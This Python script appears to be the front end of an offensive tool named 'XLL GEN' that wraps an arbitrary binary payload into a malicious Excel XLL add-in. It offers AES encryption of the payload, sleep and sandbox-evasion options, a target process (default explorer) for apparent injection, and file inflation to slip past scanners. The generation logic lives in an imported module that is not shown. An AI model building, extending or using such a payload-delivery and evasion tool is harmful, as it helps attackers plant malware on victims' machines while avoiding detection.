import argparse
from support import *

ascii_art = """
██   ██ ██      ██           ██████  ███████ ███    ██ 
 ██ ██  ██      ██          ██       ██      ████   ██ 
  ███   ██      ██          ██   ███ █████   ██ ██  ██ 
 ██ ██  ██      ██          ██    ██ ██      ██  ██ ██ 
██   ██ ███████ ███████      ██████  ███████ ██   ████ 

                                @achocolatechippancake
                                            @bobby4111
"""

def main():
    print(ascii_art)
    parser = argparse.ArgumentParser(description="Encrypt a binary file and generate C++ code.")
    parser.add_argument("-i", "--input", required=True, help="Path to the input binary file")
    parser.add_argument("-t", "--type", choices=['aes', 'none'], default='none', help="Encryption type (aes or none)")
    parser.add_argument("-k", "--key", help="Will generate if not supplied. Encryption key (128-bit AES key in hexadecimal)")
    parser.add_argument("-s", "--sleep", action="store_true", help="Add sleep function")
    parser.add_argument("--sand", action="store_true", help="Add sandbox function")
    parser.add_argument("--inflate", "-m", help="Inflate Size (Specify MB Size)")
    parser.add_argument("-o", "--output", required=True, help="Output XLL file name") 
    parser.add_argument("-p", "--process", default='explorer', help="Name of the target process (default: 'explorer')")

    args = parser.parse_args()

    input_file = args.input
    encryption_type = args.type
    key = args.key
    sleep_enabled = args.sleep
    sandbox_enabled = args.sand
    process = args.process
    output_xll_file = output_xll_file = os.path.splitext(args.output)[0]
    size = args.inflate


    if encryption_type == 'aes' and not key:
        key = os.urandom(16).hex()

    generate_c_code(input_file, encryption_type, bytes.fromhex(key) if key else None, sleep_enabled, sandbox_enabled, process)
    generate_more_code('temp')
    compile_cpp_to_xll(output_xll_file)
    cleanup()
    if size is not None:
        if not size.isdigit():
            print("Error: Size must be an integer. Inflation Failed")
            return
        size = int(size)
        inflate(output_xll_file, size)

if __name__ == "__main__":
    main()
